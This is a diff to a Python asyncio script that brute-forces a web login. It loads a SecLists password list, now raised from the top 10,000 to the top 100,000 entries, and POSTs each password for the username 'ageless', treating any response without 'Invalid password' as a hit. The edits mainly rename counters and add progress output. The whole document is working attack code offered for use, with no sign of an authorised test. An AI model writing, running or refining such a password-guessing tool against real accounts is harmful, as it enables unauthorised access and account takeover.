@@ -3,12 +3,13 @@ import async_timeout
 import multiprocessing
 from aiohttp import ClientSession, TCPConnector
 
-variable = multiprocessing.Value('i', 0)
-fp = open('/home/andrew/SecLists/Passwords/10_million_password_list_top_10000.txt')  # open file on read mode
+curr_process_req = multiprocessing.Value('i', 0)
+current_sche = multiprocessing.Value('i', 0)
+fp = open('/home/andrew/SecLists/Passwords/10_million_password_list_top_100000.txt')  # open file on read mode
 lines = fp.read().split("\n")  # create a list containing all lines
 fp.close()  # close file
-
 total = len(lines)
+total10000 = (int)(total / 10000)
 headers = {
 # "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
 "Accept-Encoding":"gzip, deflate, br",
@@ -35,15 +36,17 @@ async def lol():
 		i = 0
 		for password in lines:
 			i += 1
-			if i % 1000:
-				print("Appending tasks: {}/{}".format(i / 1000, total / 1000))
+			if i % 10000 == 0:
+				print("Appending tasks: {}/{}".format(i / 10000, total10000))
 			tasks.append(fetch(session, password))
 		return await asyncio.gather(*tasks)
 
 async def fetch(session, password):
 	try:
 		with async_timeout.timeout(5000):
-			print("Scedule {}".format(password))
+			current_sche.value = current_sche.value + 1
+			if current_sche.value % 10000 == 0:
+				print("Schedule {}/{}".format((int)(current_sche.value / 10000), total10000))
 			async with session.post(url, data={
 				"username": "ageless",
 				"password": password,
@@ -53,13 +56,13 @@ async def fetch(session, password):
 			}, headers=headers) as response:
 				result = await response.text()
 				if 'Invalid password' in result:
-					print('Incorrect {}   {}/{}'.format(password, variable.value ,total))
+					print('Incorrect {}   {}/{}'.format(password, curr_process_req.value, total))
 				else:
-					print('!!!!Correct {}   {}/{}'.format(password, variable.value, total))
+					print('!!!!Correct {}   {}/{}'.format(password, curr_process_req.value, total))
 	except Exception as e:
-		print("Error {}    {}/{}".format(e, variable.value, total))
+		print("Error {}    {}/{}".format(e, curr_process_req.value, total))
 	finally:
-		variable.value = variable.value + 1
+		curr_process_req.value = curr_process_req.value + 1
 
 
 loop = asyncio.get_event_loop()
